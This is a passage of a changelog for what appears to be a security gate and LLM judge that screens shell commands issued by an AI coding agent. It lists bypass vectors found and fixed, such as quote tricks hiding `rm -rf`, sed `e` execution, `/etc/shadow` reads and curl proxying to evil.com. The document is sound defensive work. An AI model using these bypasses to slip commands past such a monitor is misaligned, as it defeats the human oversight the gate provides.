  `writeGrantDirs`, and a write dir implies a read dir): the floor was about to
  widen the write bar for a command that only reads. The same shape minted path
  tokens out of heredoc bodies that are data, not code — `cat > out.ts <<'TS'
  … TS` reported `/etc/shadow`, which is inside the new file's own content, as a
  location the command can reach.
- **What the ledger priced.** Of the 51 unique location-floor prompts in
  `.log/decisions.jsonl` through 2026-10-16, 16 asserted `write outside base`.
  Replayed through the gate with the body rule, **all 16 lost that claim**: 7
  have no write construct anywhere in the raw text, and the single row still
  matching my widest check net was `grep -rn … 2>/dev/null` — the net keyed on
  its own discard redirect. 5 rows gained a write claim instead (`cat >
  test/…` under a re-based base: real writes that used to be reported as a
  compound location stop). 6 of the 51 were heredoc-body path false positives.
- **The detector (`config/bash-patterns.ts`).** `codeBodiesWrite(bodies, shell)`
  and `codeWriteCapable(command, text)` over `CODE_WRITE_RES` — open-mode
  arguments, `write_text`/`writeFileSync`, `os`/`shutil` mutations,
  subprocess/exec, php/ruby primitives, file verbs inside strings,
  path-shaped redirects, `eval`/`exec`, a quoted `'>'` mode — plus a stage-verb
  rule for shell bodies (`sh -c '…'`: a stage whose verb writes, or that the
  allow table has no model for, writes; the write-verb test runs FIRST because
  `isAllowedCommand` is the auto-allow table, not a read set — `touch` is on it)
  and an in-place-flag check (`perl -pi -e`).
- **Fail-closed is the loosening guard.** A body the floor cannot read stays
  write-capable: a program from a variable (`-c "$CODE"`), a heredoc the shell
  expands, a script FILE operand (`bash script.sh`), or no body text at all.
  D18's incident case — `python3 - <<'PYEOF' … open(p,'w') …` under an ungranted
  base — still stops on `write outside base`.
- **Threading.** New segment field `BashSegment.codeBodies`: every inline
  `-c`/`-e` program and every heredoc body, each tagged `opaque` when the shell
  expanded part of it, when the verb was unknown, or when the operand is a
  variable. Heredoc bodies attach through `heredocOwner()`, which reaches the
  owning command as a **sibling** — tree-sitter hangs `heredoc_body` under
  `redirected_statement`, so there is no `command` ancestor (the first
  implementation fail-closed silently on this). `WRITE_HANDLERS`' interpreter
  arms consult the same evidence, so wrapper/`find -exec` sites agree with the
  base rule.
- **Scope left alone on purpose.** The location stop for reads outside the read
  bar still fires — removing that is the read/write mode split, not this change.
  What step 1 removes is the false WRITE assertion and the write grant riding on
  it, encoded by the new gate test `a read-shaped command under a re-based base
  never asserts a write` (`r.writeOutside` undefined).
- Docs: D18 trigger class (2) amended + new "Amendment — body evidence
  (2026-10-16)" paragraph in `docs/dspa-redesign.md`.
- Suite 4050 / 51 files.

## 3.36.0 — 2026-10-16
**A variable holding the program name used to switch the operand model off entirely.**

- **What was wrong.** Operand minting is keyed on the verb: the parser mints
  path tokens only for commands whose name is on the path-aware set
  (`config/bash-patterns.ts:91`). `C=cat; $C /etc/shadow` has no static name,
  so no model engaged and the parse returned `paths=[]` — the argument that
  would have stopped the command disappeared because the *identity* moved into
  a variable. Same for `"$f" /Users/u/notes.txt`, which used to pass the floor
  (`outside base` never fired) while the typed `cat /Users/u/notes.txt` stopped.
- **The probe that corrected the plan.** The triggering live case was a Steam
  launch (`srt-bwrap --dev-bind / / bwrap --dev-bind / / …`, decision-log L94,
  auto-allowed) versus a manual sandbox-tool probe that stopped (L26). The
  hypothesis was variable blindness; a probe disproved it — literal
  `firejail --dev-bind / / echo OK` and `/usr/bin/bwrap --dev-bind / /` both
  give `paths=[]` too, because no sandbox or mount tool is on the 80-entry
  path-aware set. L26 stopped because it was wrapped in `timeout` (which is on
  the set): the two ledger lines differed by a wrapper, not by the path shape.
  So this release fixes the opaque-argv0 half; the missing sandbox-tool set is
  a separate policy decision, deliberately deferred.
- **Provable verbs get their model.** `provableArgv0Name` binds the variable
  when the command text proves the value: assigned exactly once in the scope
  visible to that segment (the same pre-fork visibility var-resolution uses),
  literal value (no `$`, backtick, brace, glob, escape; quote pair stripped).
  `C=cat; $C /etc/shadow` now mints `/etc/shadow`; bash word-splitting is
  modelled too, so `C="rm -rf /etc"; $C` mints `/etc` (the value's tail becomes
  arguments), while the quoted `"$C"` stays one argv.
- **Unprovable verbs get the worst case.** Unset, assigned twice, `C=$(…)`,
  glued `$D/tool`, `${C:-cat}`, loop variables: with no name there is no
  verb-keyed flag/path class to consult, so every non-flag operand is treated
  as a candidate file operand — the opposite of the old silence.
- **Deliberate asymmetry.** A *literal* verb off the closed set keeps that set's
  blind spot (that is where its false-positive budget lives). A variable-held
  verb states no identity, which is how a verb-keyed rule gets dodged, so it
  gets no benefit of the doubt. Closing the sandbox-tool gap means adding those
  verbs to the set, not widening this rule.
- **The obscured position is a flag, not a path.** The raw token goes to a new
  parse field `obscuredArgv0` (per-token dedup) → `CommandAnalysis` → folded
  into `safety.hasUnsafePattern` (so it reaches the packet's `obfuscation:`
  line and keeps the command out of `canBeAutoAllowed`). No `<unresolved-var>`
  sentinel: a program name is not a filesystem location.
- **Reversals recorded.** Six `cases-data` rows (`$(cat /etc/passwd)`, the
  `&&`/`||`/`;`/`|` backtick forms) flip `unsafe false → true`: a substitution
  in command position makes the program identity a runtime value. Their
  decisions stay `prompt`. The old text-level regex
  (`OBfus_VAR_HOLDING_CMD_RE`) still marks `$VAR`-led segments, so a provable
  verb remains labeled unsafe — two sources for one signal; retiring the regex
  is a follow-up.
- Docs: D23 in `docs/dspa-redesign.md` (rule, invariants, the asymmetry, what
  stays open). Suite 4047 (+20).

## 3.35.0 — 2026-10-16
**A judge failure used to record only that a failure happened.**

- **What was wrong.** The 2026-10-16 judge ledger held 4 `no-tool-call` and 2
  `bad-args` lines and nothing else: `fail()` threw the reply away and `judge()`
  inspected only `aborted`/`error`, so three different worlds shared one tally —
  a model that answered in prose, a turn that ended inside its own thinking
  block, and a call cut off mid-JSON by the token budget. The third is
  distinguishable on the wire (`finish_reason=length`, and pi preserves the
  provider's own word in `rawStopReason`); halter never looked at it.
- **The replay, recorded as a negative result.** The two commands that actually
  failed, through the real packet, prompt, schema, sampling and streaming on the
  live engine: **88/88 valid tool calls**. A valid verdict costs 4.2–7.7s and
  555–616 completion tokens; forcing a tiny budget reproduced the exact ledger
  signatures (no tool-call delta at all → `no-tool-call`; a cut mid-JSON → `{}`
  through the adapter's partial-args parse → `bad-args`) at 170–561ms, which is
  the "it failed in half a second" the operator saw. So the failure is
  stochastic, and the ledger could not say which world it was — that is the
  defect fixed here, not the sampling.
- **The reply is now kept.** `replyDiag()`: `stop=<normalized>/<finish_reason>`,
  the part kinds, the token counts (`out in cache think`), the head of any
  text/thinking, and the name of a call that exists but is unusable
  (`called=report_verdict(1 args)` — the lookup is positional, so a wrong name
  was otherwise invisible). A `length` stop is its own class, **`truncated`**:
  a budget cut must never count as a model refusing to answer. `bad-args`
  carries the finish_reason tag; the ledger `detail` widened 200 → 400 chars.
  These three lines are what settle an engine-vs-prompt-vs-budget argument from
  the ledger instead of by argument.
- **One retry, narrowly.** `no-tool-call` / `bad-args` / `truncated` get a
  second sample: at temperature 1 they are what sampling variance produces (the
  replay above answers the same request correctly), and a failure costs ~0.5s.
  `timeout`, transport and unresolved-model are NOT retried — the same request
  buys the same wait. The retry shares the response cap (it gets what the judge
  call had left, 1500ms floor), so two slow attempts can never cost
  2×`JUDGE_RESPONSE_CAP_MS`. Failures stay uncached; `attempts: 2` is recorded
  on the result and in the ledger line, so the retry's own value is measurable.
- **Tests.** 8 new: the diagnostic shape for each class, the unusable-call
  name, a retry that lands (`attempts: 2`, two calls), a double failure
  (`attempts=2` in the ledger line), and `timeout`/`call-failed` calling the
  model exactly once. The D17 ledger test now pins the full detail string.
  4027 tests pass.

## 3.34.0 — 2026-10-16
**D14 read locality from URLs only; the read itself had two fail-opens.**

- **What prompted (observed, not inferred).** `curl -s -m 5 127.0.0.1:9931/models`
  hit the floor: `NETWORK_URL_RE` required a scheme, so `isLoopbackEgress`
  saw zero destinations and failed closed — a local call to the model server,
  approved by hand. `NETWORK_URL_RE` also stopped at `]`, so
  `http://[::1]:41184/ping` reached `isLoopbackHost` truncated; D14 had
  logged bracketed IPv6 as unprovable rather than noticed the truncation.
- **Fix.** The URL regex keeps a bracketed IPv6 host whole. A destination is
  now read from either form it appears in: a URL, or a scheme-less
  `host[:port]/path` operand of curl/wget (`BARE_TARGET_RE`) — the proof is
  the HOST and the scheme adds nothing the host parse lacks. The port or path
  is what separates a target from a file operand, so `curl -O pkg.tgz` and a
  bare `curl 127.0.0.1` stay unprovable.
- **Two live fail-opens, closed by the same change.** Reading hosts out of
  more forms is only sound if a destination the parse CANNOT read is never
  dropped — dropping is fail-open, because the loopback hosts that survive
  still satisfy "every destination is loopback". `curl -x evil.com:8080
  http://127.0.0.1/y` (a proxy: off-box egress whatever the URL says) and
  `curl --proxy socks5://evil.com:1080 http://127.0.0.1/y` / `ftp://…`
  alongside a local URL both auto-judged before this (run against a 3.33.0
  tree: `JUDGED` for all three). `HOSTISH_RE` and
  `OPAQUE_SCHEME_RE` force the stop for a destination in those shapes, plus
  the scheme-less userinfo form `curl 127.0.0.1@evil.com/x`. `Accept:` (a
  header value) and `user:pass` (a credential) are excluded: a port is
  digits, and a trailing colon proves nothing.
- **Tests.** `test/dspa-gate.test.ts` — the bracketed IPv6 case moves from
  the stop list to judgeable, and 9 cases pin the new line: 4 scheme-less
  judgeable targets, and stops for `127.0.0.1.evil.com/x`,
  `evil.example.com:8080/x`, `127.0.0.1@evil.com/x`, bare `curl 127.0.0.1`,
  `curl -O pkg.tgz`, the proxy value, `socks5://` and `ftp://`. 4020 tests
  pass.

## 3.33.0 — 2026-10-16
**The bypass surface was the text layer: quote pairing, flag clusters, operand positions.**

- **What was wrong (measured, not inferred).** A new audit class — P10 in
  `test/verified-bypasses.test.ts`, 12 cases over 39 commands. Running that same
  vector list against a 3.29.0 tree in the hermetic cwd, **22 of the 39 reached
  `auto-allow`**; in this tree all 39 prompt (the other 17 already prompted and
  stay as regression pins). None of the 22 needed a policy hole — each is a bug
  in a string helper the whole gate reads:
  - `stripQuotedStrings` ran four sequential `.replace()` passes, so quotes
    paired **across different strings**: `echo '"' ; rm -rf src ; echo '"'`
    erased the middle of the command before FastAllowRule ever saw it — a
    recursive delete, auto-allowed. Same shape for an escaped quote before a
    redirect (`grep \" f1 > pwned.txt '"'`) and for ANSI-C quoting (`$'\''`),
    whose body desynchronized the passes.
  - `hasWriteRedirect` excused any segment matching `/test\s/` or `/\[\s.*\]/`,
    so the word `test ` anywhere suppressed the check: `echo test > pwned.txt`.
  - In-place flags: `dangerousSedFlags`/`dangerousPerlFlags` required the `i`
    between `[a-z]*`, so `-i~` and `-i_bak` were not in-place, and the context
    patterns missed uppercase `-Ei`.
  - sed script execution: `SED_S_EXEC_RE` hard-coded `/` as the `s` delimiter and
    knew nothing about addresses or the standalone `e` command, so `s#.*#id#e`,
    `s|.*|rm -rf src|e`, `1s/.*/id/e`, `s/.*/id/;e` and `sed 'e id' file` —
    arbitrary command execution — auto-allowed.
  - `find`/`fd` exec: `FIND_EXEC_RE` was not global, so only the *first* `-exec`
    was inspected (`find . -exec echo ok \; -exec rm {} \;`); `--exec`/
    `--exec-batch` were not matched at all (`fd --exec rm {}`); none of the three
    exec regexes carried a word boundary.
  - Pattern flags swallowed the file operand: `grep --regexp=foo /etc/passwd`,
    `rg --regexp=foo /etc/passwd`, and after `cd /etc`, `grep '/root' passwd` and
    `sed -n '/root/p' passwd` — the outside-cwd / base-access signal vanished
    because the position logic took the pattern for a path candidate and the
    operand for a pattern.
- **One scanner, one owner.** `stripQuotedStrings` is now a single left-to-right
  walk (`'…'`, `$'…'` with its own escape rules, `"…"`, `$"…"`, backslash
  escapes, word-boundary `#` comments): a quote can no longer pair with a quote
  in another string, and `\#`/`\"` cannot open a comment or a quote.
  `stripHeredocBodies` replaced quote *counting* with the same walk, so an
  unbalanced quote inside a heredoc body no longer hides the following line
  (`cat .env`). In the parser, `nonFileArgIndices(cmd, args)` is now the single
  answer to "which arguments are data, not files" — sed scripts, grep/rg patterns
  and value flags (`-e`, `--regexp=`, `--regex=`, `--expression=`, `--source`;
  rg-only value flags `-r`/`-E` kept separate from grep's boolean `-r`/`-E`), awk
  programs and `-v var=val`, shuf ranges, inline interpreter code — consumed by
  both `parseCommand` and `cwd-tracking`'s `baseAccessPath`, which had
  reimplemented the position logic and disagreed with it. Redirect targets are now
  skipped by role, not by regex, and `CWD_DEFAULT_COMMANDS` gains `rg`/`fd`.
- **Tokens carry their own expansion state.** `tokenizeSegmentQuoted` reports
  `hasExpansion`, so `cd /etc && cat '$HOME/file.txt'` (and `\$f`) is a
  *relative* path under the new base — bash does not expand a single-quoted or
  escaped `$` — instead of a closed-set `$HOME`; `isResolvableTarget` reads the
  flag instead of `includes("$")`. Arithmetic spans are stripped by a
  paren-aware scan, so `cat $(( (1+2) )) /etc/passwd` leaves no residual
  `/etc/passwd` token, and a span containing `$`/backtick stays opaque.
- **The obfuscation detectors match shell reality.** Character concatenation is
  evaluated at real quote transitions (`ec"ho` yes; a literal `'` inside
  `"foo'bar"` no), the contraction exclusions cover `'ve`/`'re`/`'ll`, `base64`
  matches `-d` and `--decode`, the hex rule requires an actual `printf`,
  `alias`/`declare` values may be quoted, and the xargs/find regexes gained word
  boundaries. The sed/perl/sort/find danger checks read quote-stripped text: a
  quoted `-i` inside a script no longer flags, and a real one no longer hides.
- **What did NOT change.** No tier, floor or grant semantic moved — every fix is
  at the text/analysis layer, and the affected commands land in tiers that
  already existed (write redirect, code-exec review, `⚠️ outside cwd`, base
  access). `[[ … ]]` bodies are still excised from redirect detection, but by
  shape now, not by matching the word `test`.
- **Tests:** the P10 block in `test/verified-bypasses.test.ts` (12 cases, 39
  commands). The 22→0 auto-allow delta was measured by running that vector list
  against 3.29.0, not by reading the regexes. 4020 pass (Linux).

## 3.32.0 — 2026-10-16
**A wide path tier reads as one location instead of a wall of `dir/*` entries.**

- **What was wrong.** A prompt whose path tier covered many directories printed
  all of them three times over: the `⚠️ outside cwd:` line joined every dir, and
  both Always labels joined `Read <dir>/*` for every dir — no cap and no width
  budget of their own. The common case was redundancy: a tier containing `/a`
  also contained `/a/aa` and `/a/ab`, which the parent grant already covers, and
  a set of sub-directories under one parent named that parent zero times.
- **The rule** (`ui/path-display.ts`, shared with the widget): a dir covered by
  another listed dir drops out of the display (`a/aa a/ab a` → `a`), and a set
  hanging under one location is named once — body
  `⚠️ outside cwd: ~/Projects/halter/ (4 dirs under it) +1 others`, label
  `Read 4 dirs under ~/Projects/halter/ +1 more`. The covering dir is the
  candidate with the most entries under it, ties broken to the deeper one, and
  the filesystem root is never a candidate. Nothing is summarized below 4 dirs
  (readable in full), a scattered set — nothing covering 2+ entries — is never
  summarized either: the body lists every dir sibling-combined for width and the
  label caps at 3 plus `…+N more dirs`. An unresolved marker dir disables the
  summary, so that signal stays visible whole.
- **What did NOT change.** This is display-only: `pathGrantDirs` and the minted
  `readDirs` stay the exact dir list, the label deliberately avoids the
  `<covering>/*` shape (that is a minted rule for a dir that is not itself
  granted — its sub-dirs are), and the tier-2 confirmation still lists every
  directory. Path display helpers moved from `ui/widget.ts` to the new module.

## 3.31.0 — 2026-10-16
**A `uv run` grant now names the dependencies it covers, and a judge failure says which kind it was.**

- **What was wrong.** A session that had once Approved a bare `uv run` carried a
  grant whose signature was `uv run`, and every `uv run --with pdfplumber …`
  form *recorded* that grant as covering it — a dependency fetch booked under
  the same bare name the operator had approved without seeing. Nothing
  auto-allowed: a dependency form floors at code-exec review (measured with
  grants `uv run`, `uv run --with pandas`, `python3`, and with dsp active), so
  this is defence in depth, not an observed bypass. What is real is the record:
  a signature counted as covered is reusable by other rules — the shape of the
  `command -v` hole.
- **The signature.** A dependency form is now `uv run --with pandas
  --with-requirements /abs/req.txt`: registry names exact (case-folded,
  extras-stripped — the same normalization trust uses), local sources resolved
  to an absolute path against the cwd the shell would actually have at that
  point in the chain. Dependency flags match exactly while every other flag
  keeps prefix semantics: a form is an allowlist, and the prefix rule exists for
  flag *omission*, which cannot silently add a fetch. Wrappers are looked
  through (`timeout`/`env`/`xargs`/`command`), reusing `getDelegatedCommand`.
  So a bare `uv run` Always covers only bare `uv run`, and `--with pandas` never
  covers `--with pdfplumber`.
- **Ungrantable forms fail closed.** A dependency no grant can name —
  `<unresolved>` from an unresolvable cwd, or an opaque quoted value — marks the
  segment ungrantable: the prompt carries `⚠️ no grant for: <sig> — a dependency
  is not a name yet; this form prompts every time`, and `Always` is refused for
  it. Granting a signature that under-names the fetch was the failure mode.
- **Grant inertia, stated.** Pre-3.31.0 `uv run` grants stop matching dependency
  forms: one re-prompt, fail closed, no migration. `generateBroaderRules` offers
  no coarse rule for a dependency form. Bare `uv run` keeps its coarse
  signature — the umbrella was never the problem, the unnamed deps were.
- **Soundness prerequisite (pre-existing defect, fixed).** `cd $(dirname x) &&
  uv run --with-requirements req.txt` left the pre-`cd` cwd as the base for
  later segments, so the analysis named a file the command never reads
  (`/Users/me/Projects/req.txt`). `resolveCdTarget` bailed out on *any*
  subshell; it now bails only when the substitution is not the `cd` target
  itself, so the base becomes unknown (`<unresolved>`, ungrantable) rather than
  guessed. `(cd /tmp; pwd) && …` still restores the base.
- **The judge's failure class reaches the surfaces.** `runJudgeStage` now
  returns a `JudgeStageOutcome` — the verdict, or `judge()`'s typed
  `failReason` plus model and latency — and every no-verdict line renders it:
  `judge: stage 2 failed (timeout 8.0s)` in the decision log, `stage 2 produced
  no verdict (no-tool-call 1.2s) — stateless stage-1 verdict only` in the dspa
  note, `⚠️ Judge: no verdict — both stages failed (auth-failed)` under dspat,
  and the "Judge again" note. The class used to stop at the judge ledger's infra
  line, which is why "stage 2 fails while the server is up" (the report that
  prompted this) was unmeasurable. `getJudgeVerdict`/`getStage2Verdict` stay as
  `.verdict` wrappers; verdict stats and the diff/paths ledger are unchanged.
- The judge packet names the deps of wrapped forms too (`timeout uv run --with
  pandas …`), through the same look-through.

## 3.30.0 — 2026-10-16
**The judge is told which registry packages `uv run --with` fetches, and a trusted-dir script is labelled honestly.**

- **A supply-chain decision the operator already made was invisible to the
  judge.** A skills-dir script run as `uv run --with <unlisted-pkg>` loses trust
  and prompts; the packet's only trace of the fetch was `network: yes (uv)`.
  The judge was asked to weigh a package download while naming no package, and
  could not tell a vetted `pandas` from `pdfplumber` — the one question the
  operator answered in `TRUSTED_PACKAGES`.
- **One walk, two consumers.** `uvRunDeps` (in `config/trusted-scripts.ts`) is
  now the single scan over the `uv run` dependency flags; `uvRunDepsTrusted`
  consumes it (semantics unchanged — the existing trust suite pins it) and the
  new `registryRunDeps(segments)` exports the `--with` packages, normalized and
  deduped, each marked `allowlisted`. Trust and the packet cannot disagree about
  which command names which dependency — the drift `config/script-operand.ts`
  exists to prevent.
- **The packet line.** `registry deps (uv fetches these at run time): pandas
  (on the operator's package allowlist), pdfplumber (not on the operator's
  package allowlist)` — 8 names max, no line at all when the command names no
  registry deps (`uvx`, `npm`, `--with-editable`/`--with-requirements` are local
  paths, not registry fetches). Knowledge, never a grant: the allowlist's only
  enforcement stays in `uvRunDepsTrusted`, and the judge's rule about fetching
  remote content is untouched. The dump-the-allowlist alternative (past 12 names
  into the system prompt) was rejected: tokens, and it invites a small model to
  relitigate config (the D21 lesson).
- **The script heading stopped lying about trust.** A payload inside the
  operator's own trusted scripts dir is not a foreign file — its INVOCATION lost
  trust (unallowlisted dep, non-transparent wrapper). `(untrusted)` overstated
  that; it now reads `(operator's trusted scripts dir — this invocation is not
  trusted)`. cwd-local scripts keep `(untrusted)`.
- **Visible friction it exposes (pre-existing, unchanged):** matching strips
  extras and case but not version specifiers, so a quoted pin is a different
  name to the allowlist — measured on the real analysis path, `--with
  "pandas>=2.0"`, `'pandas>=2.0'`, `pandas~=2.0` and `pandas@2.0` all void trust
  and now print as e.g. `pandas>=2.0 (not on the operator's package
  allowlist)`. Unquoted (`--with pandas>=2.0`), `>` is a shell redirect before uv
  ever sees the pin: the segment's dep parses as `pandas` and the redirect is
  gated separately as a write. The line names what the command fetches, not what
  the user meant.
- **Left open (unchanged, deliberate):** `fetchFormPackage`/`segmentFetchPackage`
  do not see `uv run --with` deps, so such a prompt offers no `Trust: <pkg>`
  tier and never converges (D10/D12); `getCommandSignature` drops flag values,
  so every `uv run …` shares the signature `uv run` — one Always grant covers any
  later dependency. Both need a policy decision, not this packet line.
- **Docs:** `docs/architecture.md` — the judge's packet paragraph and "Trusted
  scripts and packages" (incl. the exact-matching/pin semantics); README
  module table + "Trusted code".
- **Tests:** 7 new — 4 on `registryRunDeps` (`--with`/`--with=`, extras, env
  prefix, quotes, multi-segment, `--with-editable` names nothing, dedupe) in
  `config-helpers.test.ts`; 2 packet tests (deps line + no-line controls, the
  trusted-dir label with the cwd-local control) in `judge.test.ts`; 1
  end-to-end through `getJudgeVerdict`'s stream seam (analysis segments →
  packet) in `judge-prompt.test.ts`. 3959 pass (macOS).

## 3.29.0 — 2026-10-15

**An interpreter's inline program is data, not a location — the role rule.**

- **A program body became a location.** `python3 -c "…"` / `node -e "…"` bodies
  were minted into the path set as one opaque ref whose "token" was the whole
  mashed program: 13 of 28 `unresolved.jsonl` rows. The multi-line-literal guard
  (3.26.1) was supposed to catch them but is voided by any `$` in the body
  (`nodeHasRuntimeExpansion`), and program bodies are where `$` is densest —
  the ledger class was double-quoted bodies naming `$HOME`.
- **The rule, not the shape.** A location token is minted only at a FILE-operand
  position of a path-aware command; at a program/pattern position the argument
  is data and the shell touches no path named inside it. The parser already
  modelled that for `sed` scripts, grep/rg patterns and awk programs; the
  interpreter positions were the gap. Their flag set is read from
  `config/script-operand.ts` (`INLINE_CODE_FLAGS`, plus php's `-r`) — the same
  set that decides which operand the judge reads as the payload, so the path
  view and the judge view cannot drift.
- **Data is still read.** The program's path-like literals join the path set
  (fail closed), with closed-set `$HOME`/`${HOME}` expanded exactly where the
  shell would expand it: a double-quoted arg (an expansion child proves it) and
  HOME not reassigned. A single-quoted body's `$HOME` belongs to the interpreter
  and expands to nothing; `\$HOME` stays literal.
- **No location from an unbindable prefix.** `BODY_PATH_RE` rejects a group
  preceded by `$`/`{`/`}`: `${X}/a/b` is runtime-built, and slicing `/a/b` out
  of it minted a nonexistent cwd-nested path — counted as INSIDE, the wrong
  direction (the 3.28.2 side effect).
- **Measured on the ledger.** Replaying the 26 distinct logged commands: the 13
  body-class rows mint no token and produce no unresolved row (the one remaining
  is a genuine unbound `$PI_SESSION_FILE`); the real `python3 -c` bodies now
  contribute their true paths (`$HOME/.pi/agent/models.json` → the home path).
  End-to-end decisions on those commands are unchanged (`prompt`, both before
  and after) — the interpreter rows in `config/dangerous-patterns.ts` are what
  judges them, which is why removing the mint opens nothing.
- **The file position keeps its sentinel.** `cat "a\n$X/b"` still mints an
  opaque ref: the argument's role decides, its shape does not.
- **Docs:** `docs/architecture.md` gains "Argument roles (the data/location
  rule)"; the sed/grep/awk grammars are stated as instances of it.
- **Tests:** 9 in `bash-parser.test.ts` (both quoting directions, the brace
  form, reassigned HOME, unbindable `${X}`, literal paths inside a program,
  `php -r`, the file-position control); P9 in `verified-bypasses.test.ts` pins
  that no inline-program vector auto-allows without a location token. 3931 pass.

**Edit gating follows the harness matcher; judge path reports resolve both
sides; the suite is platform-canonical (macOS run).**

- **The edit pre-validation matched LESS than pi does — a gate bypass.** The
  check skipped the gate when a block did not match EXACTLY once, on the
  premise "pi will fail this edit". pi's edit tool (1.2.0) matches against the
  original file but falls back to `normalizeForFuzzyMatch` (NFKC, per-line
  trailing-whitespace trim, typographic quotes/dashes/spaces) and applies a
  unique fuzzy hit — so an oldText differing only by that normalization ran
  with NO prompt on exactly the edits manual mode prompts for (writes/edits).
  `handlers/file.ts` `editWillApply` now mirrors the harness end to end
  (`normalizeToLF`, the fuzzy lookup, fuzzy occurrence counting, the overlap
  check, the whole-call no-change rule) — `false` (pass ungated) is returned
  only when pi is guaranteed to fail. New tests pin: fuzzy-only match, CRLF
  match, a no-op block beside an effective one, and "unique exactly but
  duplicated fuzzily" (the one direction where passing through is still right).
- **Judge path reports are realpath'd before comparison.** `judge/paths.ts`
  `toAbs` used a lexical resolve while the floor's own paths are realpath'd —
  on macOS every /tmp, /etc, /var path the judge reported became a false
  `floorMisses` row (/tmp vs /private/tmp). The same seam sits under the D19
  write bar (`dspa-gate.ts` `judgeWriteOutside`): an unresolved report under a
  symlinked cwd path passed the bar while its real target was outside the
  base. One change (`resolvePathReal`) fixes both; symlink-based regression
  tests exercise it on Linux too (where realpath is otherwise identity).
- **Tests: Linux-hardcoded fixtures canonicalized so the suite runs on macOS.**
  The `/home/u` anonymized namespace moved to `/Users/u` (walk-up identity on
  both platforms: /Users exists on macOS and realpath keeps it, does not exist
  on Linux); `test/canon.ts` resolves system paths the way the gate does
  (/tmp→/private/tmp, /etc→/private/etc, os.tmpdir()→/private/var/folders); the
  D21 base is a hermetic `$HOME` fixture instead of the Linux-only
  `/mnt/Ndr/…` path. 62 macOS failures → 0 (3937 pass).

## 3.28.3 — 2026-10-14

**`head -n +$((MARK+1))` stopped 3 times: an arithmetic value was minted into a
path token.**

- **A number became a location.** `$((` matches `DOLLAR_EXPANSION_RE` (its
  `$(` is an expansion), so `+$((MARK+1))` passed `isOpaqueValue`, became an
  opaque ref, and was resolved to the marker path
  `<unresolved-var>/$((MARK+1))`. A sentinel can never converge
  (`canAutoAllow` requires `outsidePaths.length === 0`), so the token was an
  unfixable stop — and it polluted the unresolved ledger with 3 rows of a
  `head` line offset posing as a path.
- **An expansion-free arithmetic span is not opaque.** `isOpaqueValue` now
  returns false when the value's only runtime content is arithmetic
  (`ARITH_SPAN_RE` requires the `((` form and rejects `$`/backtick inside the
  span, so a nested substitution is never mistaken for arithmetic).
- **The residue decides, unchanged elsewhere.** A token whose non-arithmetic
  part still names a location keeps the marker: `$((n))/x`,
  `$(echo $((n)))/x`, `/tmp/$((n+1)).txt` — and so does
  `/tmp/x$(( $(date +%s) ))`, where the substitution's side effect is the only
  thing being flagged.
- **No arithmetic evaluation.** Nothing downstream needs the number — only the
  absence of a fake path — so `$((…))` is not parsed further and `MARK=$((…)`
  stays unbound.
- **Tests:** `bash-parser.test.ts` pins the ledger case, the option/nested
  sub-expression forms, and the path-bearing residues; P8 in
  `verified-bypasses.test.ts` pins the end-to-end decisions (numeric argument
  auto-allows, residue forms still prompt).

## 3.28.2 — 2026-10-14

**`$f` was the ledger's most-stopped token, and its value was `$HOME/…`.**

- **8 gate stops in one window for one token.** Its owner was an assignment
  `f="$HOME/…/history.jsonl"`. The parser resolves a bare `$HOME` in *path*
  position (the closed set: `HOME_TOKEN_RE` / `expandHomeToken`), but the
  dataflow layer never applied that set inside an *assignment value*:
  `resolveValue` returned null, `resolveAt` fell through to
  `{kind:"sentinel", reason:"var"}`, and the marker `<unresolved-var>/$f` made
  convergence impossible — `canAutoAllow` requires `outsidePaths.length === 0`,
  so a sentinel stops every time. `~` and `f=~/x` were already bound; `$HOME`
  was the hole.
- **The closed set now binds in assignment values.** `resolveRef` substitutes
  bare `$HOME`/`${HOME}` with `os.homedir()`, threaded as `homeStatic` through
  `substitute`/`resolveValue`/`resolveRef`/`resolveAt`/`resolveOneRef`. Not a
  new rule: the same set path position already trusts — a value the gate knows
  without asking the shell.
- **Guarded the way `~` is guarded.** A command that reassigns HOME where the
  assignment map cannot see it — an env prefix (`HOME=/tmp f=$HOME/x; cat $f`)
  — falls back to the sentinel, since the runtime value differs. A standalone
  `HOME=/tmp` IS in `assignments`, so the map wins over the static value
  (`export HOME=/x` and `readonly HOME=/x` reach the map too, and bind
  `/x/j`). An ambiguous HOME (assigned twice in one command) gets no static
  fallback. Binding is not a grant: `f=$HOME/.ssh; cat $f/id_rsa` still
  prompts, and `$HOME/../x` collapses to a concrete outside path that prompts.
- **`unset HOME` needed new parser surface.** `unset` parses as its own node
  type, `unset_command`, which is not in `STATEMENT_ITEMS` and therefore never
  becomes a segment — `homeReassigned` cannot see it, and the guard would have
  expanded `$HOME` to the real home while bash expands it to the empty string.
  `parseCommand()` now returns `unsets: string[]` and `resolveOpaqueRefs` takes
  it as a required argument, so a caller that forgets it is a compile error.
  `unset -f HOME` over-collects; the cost is one sentinel, i.e. the pre-3.28.2
  behaviour.
- **Known limits recorded, not papered over.** `${HOME:-/tmp}/x` binds `/tmp/x`
  — the default form keeps its old meaning instead of being read as
  unset-or-default. `unset` of an *assigned* var leaves the stale binding
  (`f=x; unset f; cat $f` still binds `x`; 0 ledger occurrences) — a
  pre-existing mis-binding, and the wider consequence of `unset_command` not
  being a statement item is that every segment-based analysis is blind to
  `unset`: `HOME_BUILTIN_RE`'s `export`/`declare`/`typeset`/`readonly`/
  `unset` alternatives are dead (those forms reach `assignments` instead),
  only `read HOME` is live.
- **Tests:** `verified-bypasses.test.ts` gains P7 — the closed set pinned
  against credential laundering, `..` collapse, env-prefix/`unset`/quote
  guards, and the ledger case (`f="$HOME/.pi"; ls $f` auto-allows).
  `var-resolution.test.ts` covers the binding forms, transitive `f`→`g`,
  map-wins and the sentinel trio; `bash-parser.test.ts` pins `unsets`
  collection.

## 3.28.1 — 2026-10-14

**Wrapped runs identified no script — the judge had nothing to read.**

- **Reported live, then confirmed in the ledger.** A `npx tsx /tmp/…/probe.mts`
  prompt read "the script's contents and npx network fetch are unverifiable →
  DEFER". The same command run directly is judged ON its payload. Every skill-
  script invocation is affected: `uv run --with <deps> python …` is the mandated
  form, and identification failed for it.
- **The cause was one token slot, not the judge.** `identifyScriptFile`
  (`analysis/script-payload.ts`) only looked at `tokens[0]`, so any wrapper
  (`npx`, `uv run`, `uvx`, `timeout`, `env`, `nice`, a path-like launcher) ended
  the scan. All three consumers of the identification lost the same
  information at once: the packet's fenced content, the D3/D11 conversions, and
  the D13 `executedScriptPaths` ledger.
- **One scan, two consumers: new `config/script-operand.ts`.** Trust
